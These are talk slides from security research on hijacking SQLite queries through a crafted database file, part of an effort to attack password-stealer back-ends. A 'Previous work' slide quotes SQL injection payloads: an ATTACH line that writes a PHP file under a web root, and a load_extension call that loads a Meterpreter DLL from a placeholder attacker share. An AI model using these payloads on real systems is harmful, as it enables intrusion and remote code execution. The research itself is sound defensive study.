SELECT code_execution FROM * USING SQLite;
 -- gaining code execution using a malicious SQLite database
Omer Gull
Check Point Research
whoami
•
Omer Gull 
•
Vulnerability Researcher 
•
Check Point Research for the past 3 years 
•
Now at Hunters.AI
Agenda
•
Motivation and back story 
•
SQLite3 Intro 
•
Examining the attack surface of a malicious DB 
•
Previous work 
•
Memory corruptions exploitation using pure SQL 
•
Query Oriented Programming© 
•
Demos 
•
Future work and conclusion
Motivation
•
SQLite is one of the most deployed software modules 
•
Querying an SQLite database is CONSIDERED SAFE 
•
Spoiler: it’s not
Prologue
•
Password stealers! 
•
A computer gets infected 
•
Malware collects stored credentials maintained by various clients  
•
Some client software store your secrets in SQLite databases  
•
Malware sends SQLite DBs to C2 server  
•
C2 extracts secrets and stores the loot
How It all Began
•
So one day, @Omriher and I were looking at the leaked sources of a 
notorious password stealer and thought to ourselves 
•
These guys just harvest a bunch of our DBs and parse them in their back-
end 
•
Can we leverage the load and query of an untrusted database to our 
advantage? 
•
Could have much bigger implications in countless scenarios as SQLite is so 
popular 
•
And so began the longest CTF challenge
SQLite3
•
Unlike most other SQL databases, SQLite does not have a client server 
architecture 
•
SQLite reads and writes directly to files 
•
A complete DB with multiple tables, indices, triggers and views is contained 
in a single file 
Examining the Attack Surface
•
sqlite3_open($FileDB) 
•
sqlite3_query(“SELECT..”)
    private function processnote($Data) 
    { 
        $FileDB = GetTempFile('notezilla'); 
        if(!file_put_contents($FileDB, $Data)) 
            return FALSE; 
        $db = new SQLite3($FileDB); 
        if(!$db) 
            return FALSE; 
        $Datax = $db->query('SELECT BodyRich  FROM Notes'); 
    $Result = ''; 
        while($Element = $Datax->fetchArray()) 
        { 
$Data__ = rtf2text($Element['BodyRich']); 
if(strlen($Data__)) 
{ 
$Result .= $Data__; 
$Result .= str_pad("", 30, "-") . "\r\n"; 
} 
        } 
   $this->insert_downloads(substr($Result, 0, 20) . ".txt", $Result); 
        $db->close(); 
   $db = $Datax = $Result = NULL; 
        @unlink($FileDB); 
    }
The Attack Surface:  
sqlite3_open()
•
Setup and configuration code 
•
Straight-forward header parsing 
•
Header is 100 bytes long 
•
Fuzzed to death by AFL 
•
Not a very promising path to pursue :(
The Attack Surface:  
sqlite3_query(“SELECT…”)
•
Using SQLite authors’ words: 
•
SQLite is a Virtual Machine 
•
Queries are compiled to bytecode  
•
sqlite3_prepare() -  would walk and expand the query  
-
For example, rewrite * as all column names 
•
sqlite3LocateTable() -verifies that all relevant objects actually exist and locates 
them
“The SELECT statement is the most complicated command in the SQL language”
Preparation step 
sqlite_master schema
CREATE TABLE sqlite_master ( 
  type TEXT, 
  name TEXT, 
  tbl_name TEXT, 
  rootpage INTEGER, 
  sql TEXT 
); 
•
Every SQLite database has an sqlite_master table that defines the schema 
for the database
•
sql is the DDL describing the object 
Data Definition Language
•
DDL commands are like header files in C 
•
Used to define the structure, names and types within a database 
•
Appears in plain-text within a file
Data Definition Language
➜  /tmp sqlite3 hello_world.db 
SQLite version 3.24.0 2018-06-04 14:10:15 
Enter ".help" for usage hints. 
sqlite> CREATE TABLE my_table (col_a TEXT, col_b TEXT); 
sqlite> INSERT INTO my_table VALUES ('hello', 'world'); 
sqlite> .quit 
➜  /tmp xxd -a hello_world.db  
00000000: 5351 4c69 7465 2066 6f72 6d61 7420 3300  SQLite format 3. 
00000010: 1000 0101 0040 2020 0000 0002 0000 0002  .....@  ........ 
00000020: 0000 0000 0000 0000 0000 0001 0000 0004  ................ 
00000030: 0000 0000 0000 0000 0000 0001 0000 0000  ................ 
00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................ 
00000050: 0000 0000 0000 0000 0000 0000 0000 0002  ................ 
00000060: 002e 2480 0d00 0000 010f b400 0fb4 0000  ..$............. 
00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................ 
* 
00000fb0: 0000 0000 4a01 0617 1d1d 0169 7461 626c  ....J......itabl 
00000fc0: 656d 795f 7461 626c 656d 795f 7461 626c  emy_tablemy_tabl 
00000fd0: 6502 4352 4541 5445 2054 4142 4c45 206d  e.CREATE TABLE m 
00000fe0: 795f 7461 626c 6520 2863 6f6c 5f61 2054  y_table (col_a T 
00000ff0: 4558 542c 2063 6f6c 5f62 2054 4558 5429  EXT, col_b TEXT) 
00001000: 0d00 0000 010f f100 0ff1 0000 0000 0000  ................ 
00001010: 0000 0000 0000 0000 0000 0000 0000 0000  ................ 
* 
00001ff0: 000d 0103 1717 6865 6c6c 6f77 6f72 6c64  ......helloworld
sqlite_master
Back to Query Preparation
•
sqlite3LocateTable() attempts to find the structure describing the table we 
are interested in querying 
•
Reads the schema available in sqlite_master 
•
If this is the first time doing it, it will also have a callback function for every 
DDL statement 
•
The callback validates the DDL and builds the internal data structures of the 
object
DDL Patching
•
Can we just replace the SQL query within the DDL?
int sqlite3InitCallback(void *pInit, int argc, char **argv, char **NotUsed){ 
  InitData *pData = (InitData*)pInit; 
  sqlite3 *db = pData->db; 
  int iDb = pData->iDb; 
  ... 
  if( argv==0 ) return 0;   /* Might happen if EMPTY_RESULT_CALLBACKS are on */ 
  if( argv[1]==0 ){ 
    corruptSchema(pData, argv[0], 0); 
  }else if( sqlite3_strnicmp(argv[2],"create ",7)==0 ){ 
    int rc; 
    ... 
    TESTONLY(rcp = ) sqlite3_prepare(db, argv[2], -1, &pStmt, 0);
CREATE
•
Still leaves some room for flexibility
CREATE VIEW
•
VIEW is simply a pre-packaged SELECT statement 
•
VIEWs are queried similarly to TABLEs
SELECT col_a FROM my_table == SELECT col_a FROM my_view
Query Hijacking
•
Patch sqlite_maser’s DDL with a VIEW instead of TABLE 
•
Our patched VIEW can have any SELECT we wish 
•
we can now interact with vast parts of the SQLite interpreter using our 
SELECT sub-query 
Query Hijacking Example
CREATE TABLE dummy ( 
col_a TEXT, 
col_b TEXT 
);
SELECT col_a, col_b FROM dummy;
CREATE VIEW dummy(cola, colb) AS SELECT (),  ();
•
The original database had a single TABLE
•
Target software would query it with the following
•
The following VIEW can hijack this query
Query Hijacking Example
➜  /tmp sqlite3 query_hijacking.db 
SQLite version 3.24.0 2018-06-04 14:10:15 
Enter ".help" for usage hints. 
sqlite> CREATE VIEW dummy(cola, colb) AS SELECT ( 
   ...> SELECT sqlite_version() 
   ...> ),( 
   ...> SELECT printf('SQLite implemented their own %s', 'printf') 
   ...> ); 
sqlite> .quit
➜  /tmp sqlite3 query_hijacking.db  
SQLite version 3.24.0 2018-06-04 14:10:15 
Enter ".help" for usage hints. 
sqlite> SELECT cola, colb FROM dummy; 
3.24.0|SQLite implemented their own printf 
sqlite> 
•
We just gained control over the query 
•
What can we do with it?
Previous Work
SQL Injection 
•
A couple of known SQLi tricks in SQLite 
-
Can’t ATTACH, DDL must begin with “CREATE “ 
-
Disabled by default :(
Credit: http://atta.cked.me/home/sqlite3injectioncheatsheet
ATTACH DATABASE ‘/var/www/lol.php’ AS lol; 
CREATE TABLE lol.pwn (dataz text); 
INSERT INTO lol.pwn (dataz) VALUES (‘’);--
SELECT load_extension('\evilhost\evilshare\meterpreter.dll','DllMain');--
Memory Corruptions and SQLite
•
SQLite is written in C 
•
“Finding bugs in SQLite, the easy way” 
•
22 bugs in 30 minutes of fuzzing
CREATE VIRTUAL TABLE t0 USING fts4(x,order=DESC); 
INSERT INTO t0(docid,x)VALUES(-1E0,'0(o'); 
INSERT INTO t0 VALUES(''); 
INSERT INTO t0 VALUES(''); 
INSERT INTO t0 VALUES('o'); 
SELECT docid FROM t0 WHERE t0 MATCH'"0*o"';
https://lcamtuf.blogspot.com/2015/04/ﬁnding-bugs-in-sqlite-easy-way.html
Memory Corruptions and SQLite
•
Interestingly, since version 3.8.10 (2015) SQLite started using AFL as an 
integral part of their remarkable test suite 
•
These memory corruptions proved to be difficult to exploit without a 
convenient environment 
•
The Security research community soon found the perfect target
WebSQL For Developers
•
Web page API for storing data in databases 
•
Queried using Javascript 
•
SQLite backend 
•
Available in Chrome and Safari
var db = openDatabase('mydb', '1.0', 'Test DB', 2 * 1024 * 1024);  